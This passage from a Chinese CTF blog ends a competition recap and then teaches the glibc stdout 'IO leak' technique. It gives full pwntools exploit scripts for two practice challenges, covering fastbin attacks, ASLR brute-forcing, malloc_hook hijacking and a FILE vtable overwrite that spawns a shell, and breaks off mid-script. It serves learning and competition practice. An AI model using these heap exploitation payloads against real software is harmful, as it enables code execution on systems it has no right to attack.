Leak，h1师傅做的那个是堆题，整体不算难，但是用ida打开之后的数据是混乱的(这里不知道是怎么实现的)，反正主要是靠交互来完成的大体脚本，最后的一些细节是读了下汇编调了一下搞定的。另外两道pwn，一个是格式化字符串加栈溢出，正常来说这个题肯定是要被打烂的，但是这个题上了拟态防御，就是我的一个payload打过去，服务端那里挂起的好几个程序的回显一样才可以正常运行，因此格式化字符串和栈溢出其实全都用不了，一道真正意义上的无解PWN(没错，这题放出来就不是让得分的，而是为了证实这个拟态防御的强大…)，另外一道在得知了也是无解之后就没再看了。</p><p>然后pwn做完之后，就没事干了。因为这个比赛考的主要是对设备的真实攻击和拟态防御而并非是CTF，所以CTF题目只是为了解出来得分，然后去做其他赛道的题目，攻击真实设备。</p><p>后面的几天PWN手就做大牢了，除了一个ADAS和T-BOX4这俩拿到了二进制文件，剩下的题目基本都没有PWN手的事情了，那两个二进制文件都是跟着winmt师傅分析学习了一下，都是aarch64的程序我记得。目的是找漏洞写报告，并不是拿shell(因为给的二进制文件也不完整)</p><p>winmt师傅给我说的思路是可以从危险函数下手，看交叉引用然后如果危险函数的参数可控，那就属于一些漏洞，比如exec的参数可控就是任意命令执行，或者fopen函数的参数可控就是任意文件读取等等(当然实际要比这复杂，主要是需要逆向和仔细分析)，当时我们找到了一个栈上的off by null漏洞，以及一个堆溢出的漏洞和格式化字符串漏洞，剩下基本上都是web大哥们在疯狂上分。</p><p>除去比赛之外，让我印象比较深的就是吃的非常nice，这些天吃了火锅 烤肉 披萨 烤鸭 鲍鱼 金汤肥牛 煲仔饭等等，他们熬夜干到很晚的师傅还吃了KFC(好像当时就我睡了 0.0)，然后晚上还和h1师傅看了两场世界杯(虽然在看决赛的时候他几乎一直在睡觉QAQ)</p><h3 id="尾声：">尾声：</h3><p>最后比赛的成绩还可以吧，主要是第一次打这个没经验，其实应该先去打那些设备交实验报告得分，而不是先逮着CTF的题目日，这就导致了一些队伍把很简单的漏洞找到并且提交报告后，那些设备就下线了，错失了最开始的得分机会。</p><p>不过这次比赛收获还是蛮大的(虽然很多时候在摸鱼)，但是能和师傅们一起线下交流其实还挺不错的，尤其是winmt师傅的现场教学QAQ。</p><p>最后来了一张三个PWN手的合影 -&gt;_-&gt;</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221300998.jpg" alt="img" style="zoom:50%;" /><p>以及所有人的合照</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221300400.jpg" alt="img" style="zoom:50%;" /><p>当然了  最牛皮的居然是发现自己上电视了</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221301622.jpg" alt="img" style="zoom:50%;" /><p>坏消息是我们全军覆没，直接都成小阳人…</p><p>之后还得再提升自己的技术，希望有更多机会和师傅们一起参加线下赛</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>关于IO leak的学习总结</title>
      <link href="/posts/a9dd00f0.html"/>
      <url>/posts/a9dd00f0.html</url>
      
        <content type="html"><![CDATA[<p>近期针对io leak这个手法，进行了学习，并做了几道相关题目。整理了一下，写了这篇文章。以后遇到了新的io leak的题目，再更新上来。</p><h1>总结：</h1><blockquote><p>大致原理：</p><p>通过篡改_IO_2_1_stdout_结构体中的flags字段和_IO_write_base字段，通过篡改flags字段来绕过一些检查，通过篡改_IO_write_base字段使得系统调用write打印_IO_write_base字段与_IO_write_ptr字段之间的内容泄露出libc地址。</p><p>使用前提：</p><p>1、程序没有show函数</p><p>2、开启了FULL RELRO保护</p><p>利用过程：</p><p>1、想办法将_IO_2_1_stdout_结构体申请出来。</p><p>2、往_IO_2_1_stdout_结构体写入构造好的数据(具体是什么下面会说)。</p><p>3、执行任意一个puts函数，就可以将libc地址泄露出来。</p></blockquote><h2 id="第一步–申请">第一步–申请</h2><p>在不同的libc版本，申请时也有略微的区别。</p><h3 id="不同libc版本对于stdout结构体的申请">不同libc版本对于stdout结构体的申请</h3><p>先说2.27和2.31这两个版本，因为在这两个版本时，没有针对tcachebin的fd指针进行相关保护。就导致了tcache poisoning修改其fd指针就可以直接将堆块申请出来。所以我们只要能控制fd指针，就可以直接将_IO_2_1_stdout_结构体(之后统称为stdout结构体)申请出来。</p><p>而在2.23的libc版本中，从fastbin中申请堆块是对size位进行了检查。而我们能伪造size通过检查的地址只有malloc_hook-0x23和stdout结构体地址-0x43这两处。不过还好我们依然可以通过伪造size将stdout结构体申请出来。因此只要能控制fastbin中的fd指针，问题依然不大。</p><p>PS：为什么只有2.23 2.27 2.31这三个版本的libc。淦，因为目前只练习了这三个版本的io leak。</p><h3 id="爆破一比特申请stdout结构体">爆破一比特申请stdout结构体</h3><p>但上面这两种情况都没有考虑到一个问题，就是使用io leak的时候，肯定我们是没有libc地址的，那我们就无法直接将tcachebin或者fastbin的fd指针修改为stdout结构体地址。对此我们采用的策略是利用unsorted bin中的fd指针进行利用。因为unsorted bin中的fd指针指向了的是main arena+88或者main arena+96的位置，这里位于libc中。如果这个地址能出现在fastbin或者tcachebin中fd的位置，且我们可以对fd指针进行编辑，那我们就可以将其修改为stdout结构体地址(stdout结构体地址的后三位是固定的，但是倒数第四位会因为ASLR的原因而随机化，可我们只能写入两字节，无法写入一个半字节，因此倒数第四位只能通过爆破来预测)。</p><h3 id="如何在fastbin或者tcachebin中留下unsorted-bin中的fd指针？具体情况，具体分析">如何在fastbin或者tcachebin中留下unsorted bin中的fd指针？具体情况，具体分析</h3><p>而如何让unsorted bin中的fd指针出现在fastbin或者tcachebin中的fd的位置，这就属于八仙过海各显神通了，不同题目的思路都不一样。这里就具体题目具体分析吧。</p><h2 id="第二步–编辑">第二步–编辑</h2><p>将stdout结构体申请出来后，正常情况下是可以往里面写入数据的。</p><p>我们需要<strong>覆盖stdout结构体中的_flags字段为0xfbad1887，并且覆盖_IO_read_ptr、_IO_read_end、_IO_read_base这三个指针为0，最后覆盖_IO_write_base指针的最后一字节为00</strong>(这里并不是非要为00，因为到时候puts函数会泄露_IO_write_base指针与_IO_write_ptr指针之间的所有数据，只要将_IO_write_base指针改的小于_IO_write_ptr指针并且确定这二者之间存在libc地址，那么都是可以的，只不过我通常将其覆盖为\x00)</p><p>至于为什么要将_flags字段改为0xfbad1887这个值，是因为这个字段的各个比特位都属于标志位，不同比特位存在的意义不同，能绕过的检查也不同。而将_flags字段改为0xfbad1887这个值，正好可以绕过阻止我们完成io leak的所有检查(具体是哪些检查又或者如何绕过的，可以去网上看一下其他师傅的博客，当时感觉师傅们写的很全并且很好，我就没再去单独写了)，然后read那三个指针，我试了一下，他们的值无所谓(不一定非要写成00)。</p><p>编辑后stdout结构体如下：</p><p><img src="../img/2706180-20220826111011178-1206554709.png" alt=""></p><h2 id="第三步–泄露">第三步–泄露</h2><p>emmm，前两步都完成的话，第三步执行puts函数时顺其自然就泄露了libc地址，这个就没啥好说的了。</p><h1>题目练习</h1><h2 id="de1ctf-2019-weapon">de1ctf_2019_weapon</h2><h3 id="保护策略：">保护策略：</h3><p><img src="../img/2706180-20220826111041719-1027187867.png" alt=""></p><h3 id="漏洞分析：">漏洞分析：</h3><p><img src="../img/2706180-20220826111054199-1620326152.png" alt=""></p><p>delete函数中存在UAF漏洞。</p><h3 id="大致思路：">大致思路：</h3><p>在2.23的libc中的话，可以利用UAF打一个double free。利用edit函数的话再打一个fastbin attack。_IO_2_1_stdout结构体上方和__malloc_hook上方都有一个0x7f(这个具体的要求就是有一个0x7f开头的地址，然后该地址的下一个内存单元为NULL)，可以去利用fastbin attack从这里申请出来一个fake chunk，最终可以泄露libc地址或者劫持hook获取shell。</p><h4 id="伪造size，将chunk释放到unsorted-bin中">伪造size，将chunk释放到unsorted bin中</h4><p>由于这道题无法申请超过0x60的chunk，因此我们的正常chunk被释放掉无法进入unsorted bin中，所以需要先打一个fastbin attack将一个fake_chunk申请到某个堆块的size位上方，然后通过edit函数来篡改其size位。放入unsorted bin中的原因是因为我们无法泄露libc地址，因此无法直接拿到_IO_2_1_stdout结构体的地址，只能利用unsorted bin中的fd指针main_arena+88这个libc地址，通过篡改其后四比特位(最后三位是固定的，倒数第四位需要爆破)来获取_IO_2_1_stdout结构体上方的地址。</p><p>这部分脚本如下:</p><p>就是先打一个fastbin attack，然后申请出来fake chunk，篡改一个chunk的size即可。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">8</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="number">7</span>,<span class="string">&#x27;prevent_chunk&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x50&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_a,d_d,d_e,<span class="number">0xB35</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xe1</span>))</span><br></pre></td></tr></table></figure><p>下图已经篡改成功：</p><p><img src="../img/2706180-20220826111117610-1516022746.png" alt=""></p><h4 id="将unsorted-bin中的堆块放入fastbin中">将unsorted bin中的堆块放入fastbin中</h4><p>因为需要打fastbin attack将main_arena+88这个地址进行篡改，所以要先把unsorted bin中的堆块放入fastbin中，想实现这个的话，还是用fastbin attack进行操作。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)#将大堆块释放，使其进入unsorted bin中</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_a,d_d,d_e)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,<span class="string">&#x27;\x70&#x27;</span>)#将unsorted bin中的堆块篡改到fast bin上</span><br></pre></td></tr></table></figure><p>上述代码实现将unsorted bin中的堆块放入fast bin中。</p><p>下图为修改前的bins情况<br><img src="../img/2706180-20220826111157348-1189507279.png" alt=""></p><p>下图为修改后的bins情况</p><p><img src="../img/2706180-20220826111208472-424079904.png" alt=""></p><h4 id="爆破一比特位，将fake-chunk申请到stdout结构体上方">爆破一比特位，将fake_chunk申请到stdout结构体上方</h4><p>由于我们的fake_chunk进入了fast bin中，但是其size是之前被伪造过的0xe1，要想从fastbin中再申请出来还需要再改回去。同时需要打fastbin attack将fake_chunk申请到stdout结构体上方，这个地址是在&amp;_IO_2_1_stdout_-0x43的位置，因为我们需要一个地址是0x7f开头，同时下一个内存单元为0的地址。</p><p>如下图这里就是符合条件的地方：</p><p><img src="../img/2706180-20220826111255470-1590182798.png" alt=""></p><p>经过计算发现该stdout结构体地址-0x43的位置成功伪造了size</p><p><img src="../img/2706180-20220826111308632-2123238392.png" alt=""></p><p>而这个地址的后三位是固定的，倒数第四位是随机的 ，但是我们只能写两字节因此第四位必须要去爆破。(在调试的时候关闭ASLR就无需爆破了，等脚本写完了再去写爆破部分)</p><p>然后fake_chunk申请到stdout结构体上方后，我们去改变结构体的_flags字段和_IO_write_base字段(具体原理的话可以看这篇<a href="https://www.cnblogs.com/pwnfeifei/p/15793432.html">文章</a>)，等再次调用puts函数的时候，我们就可以获取libc基地址了（需要注意的是将_flags字段改成0xfbad1880，之后的puts都不会再加\n了，因此要处理一下接收部分。不过用0xfbad1887就是正常的）。</p><p>这部分exp中的代码如下：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+<span class="string">b&#x27;\xdd\x25&#x27;</span>)<span class="comment">#伪造0x71的size，使其通过fast bin的检查,伪造fake chunk到stdout结构体上方(需要爆破一位)</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">9</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#将fastbin中的堆块申请出去，打fastbin attack</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">11</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)<span class="comment">#篡改结构体中的字段</span></span><br><span class="line">leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure><h4 id="劫持malloc-hook">劫持malloc_hook</h4><p>有了libc基地址，还可以打fastbin attack的话，那就是一个常规的劫持malloc_hook了，就利用malloc_hook-0x23那个位置存在的0x7f来伪造成size将malloc_hook申请出来，然后这道题的话one_gadget也都不通，需要用realloc函数来调整一下栈帧。</p><p>这部分exp如下：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>) </span><br><span class="line">delete(<span class="number">10</span>,<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">10</span>,p64(malloc_hook-<span class="number">0x23</span>),<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">12</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">13</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(one_gadget)+p64(realloc+<span class="number">6</span>),<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;wlecome input your size of weapon: &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x60</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(<span class="number">14</span>))</span><br></pre></td></tr></table></figure><h3 id="EXP">EXP:</h3><p>由于这道题需要爆破一比特位，因此我们最终还有再加一个爆破部分。最终的exp如下：<br><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28187)</span></span><br><span class="line">d_a=<span class="number">0xEAE</span></span><br><span class="line">d_d=<span class="number">0xec0</span></span><br><span class="line">d_e=<span class="number">0xed2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,index,content,choice=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; \n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;wlecome input your size of weapon: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;input your name:\n&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;input your name:&#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content,choice=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; \n&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input idx: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;new content:\n&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;new content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index,choice=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; \n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input idx :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">8</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">7</span>,<span class="string">&#x27;prevent_chunk&#x27;</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;\x50&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xe1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)<span class="comment">#将大堆块释放，使其进入unsorted bin中</span></span><br><span class="line">    </span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    edit(<span class="number">8</span>,<span class="string">&#x27;\x70&#x27;</span>)<span class="comment">#将unsorted bin中的堆块篡改到fast bin上</span></span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+<span class="string">b&#x27;\xdd\x25&#x27;</span>)<span class="comment">#伪造0x71的size，使其通过fast bin的检查,伪造fake chunk到stdout结构体上方(需要爆破一位)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">9</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#将fastbin中的堆块申请出去，打fastbin attack</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">11</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3c5600</span></span><br><span class="line">    malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    one_gadget=libc_base+search_og(<span class="number">1</span>)</span><br><span class="line">    realloc=libc_base+libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">    log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>) </span><br><span class="line">    delete(<span class="number">10</span>,<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">10</span>,p64(malloc_hook-<span class="number">0x23</span>),<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">12</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">13</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(one_gadget)+p64(realloc+<span class="number">6</span>),<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;wlecome input your size of weapon: &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x60</span>))</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,d_a,d_d,d_e)</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(<span class="number">14</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29923</span>)</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220826111332346-148506803.png" alt=""></p><h2 id="nsctf-online-2019-pwn1">nsctf_online_2019_pwn1</h2><p>通过这道题的学习与总结有：</p><p>1、篡改_IO_FILE结构体中的vtable字段时，要不可避免的填充之前的字段，但如果将_lock字段破坏的话，在执行输出函数中最开始上锁的宏<code>_IO_acquire_lock (_IO_stdout)</code>就会崩溃掉，因此需要保证_lock字段是正常的。</p><p>2、如果想通过直接修改_IO_2_1_stdout_结构体中的字段来获取shell的话，我们可以将_flags字段写入字符串/bin/sh\x00(是字符串，并非该字符串的地址)，然后将vtable修改为_IO_2_1_stdout_的地址+0x10，然后将_IO_save_base字段写成system地址，最后要将_lock字段写入原本正常的值。这样当执行puts函数的时候会调用vtable中的_IO_new_file_xsputn函数，但是vtable已经被修改，这个函数的偏移是0x38,而vtable被修改成_IO_2_1_stdout_的地址+0x10,最终调用的是_IO_2_1_stdout_的地址+0x48的函数指针，而这个位置就是_IO_save_base字段，里面放的是system的地址。而_IO_new_file_xsputn函数的第一个参数是_IO_2_1_stdout_的地址，而这个地址原本应该是_flags字段，但是现在却被写入了/bin/sh字符串。因此本来正常调用的_IO_new_file_xsputn函数如今变成了system(‘/bin/sh\x00’),从而获取shell。(该方法只能在libc2.23以上的版本就无法再使用了)</p><p>3、<strong>只有off by null漏洞的话，想需要将unsorted bin中的fd放到fastbin的fd上，需要打两次off by null+堆块重叠，并且最后将其申请出来之前，需要篡改一下size的大小。</strong></p><h3 id="保护策略：-v2">保护策略：</h3><p><img src="../img/2706180-20220826111350808-1322092443.png" alt=""></p><h3 id="漏洞分析">漏洞分析:</h3><p>首先在edit函数中，输入索引的部分，检查不完全，导致了这个索引是可以为负溢出的。</p><p><img src="../img/2706180-20220826111401744-135014955.png" alt=""></p><p>然后在edit函数写入数据的地方，如果add创建时的大小等于edit时输入的大小，那么就有一个off by null漏洞。</p><p><img src="../img/2706180-20220826111445836-811184644.png" alt=""></p><h3 id="利用思路：">利用思路：</h3><h4 id="思路一：利用索引为负，溢出漏洞">思路一：利用索引为负，溢出漏洞</h4><p><img src="../img/2706180-20220826111507589-1206383168.png" alt=""></p><p>我们发现数组的索引为负数，是可以找到bss段存放的stdout指针，而这个指针存放的是_IO_2_1_stdout_结构体指针，如果read往里面写数据的话，就可以直接篡改_IO_2_1_stdout_结构体的各个字段。</p><p>通过这个方式，我们可以打一个io leak，泄露libc地址，然后再篡改_flags、_lock、vtable、_IO_save_base字段，最终劫持vtable中的_IO_new_file_xsputn函数为system函数，执行获取shell。</p><p>这次跟着<a href="https://www.cnblogs.com/LynneHuan/p/15229822.html">roderick师傅的博客</a>学到了这个FileStructure()的用法，感觉蛮方便的。<br><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><h4 id="EXP-v2">EXP:</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27580</span>)</span><br><span class="line">d_a=<span class="number">0xF1B</span></span><br><span class="line">d_d=<span class="number">0xF27</span></span><br><span class="line">d_e=<span class="number">0xF3f</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the content:\n&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Add success\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Input new content:\n&#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Delete success\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">payload=p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>//改成<span class="number">0xfbad1887</span>的话,puts函数打印出来的数据后面依然有\n</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a,d_e,0xe34)</span></span><br><span class="line">edit(-<span class="number">0x10</span>,<span class="number">0xf0</span>,payload)</span><br><span class="line">leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3c36e0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">file=FileStructure()</span><br><span class="line">file.flags=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">file.vtable=libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]+<span class="number">0x10</span></span><br><span class="line">file._IO_save_base=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">file._lock=libc_base+<span class="number">0x3c6780</span><span 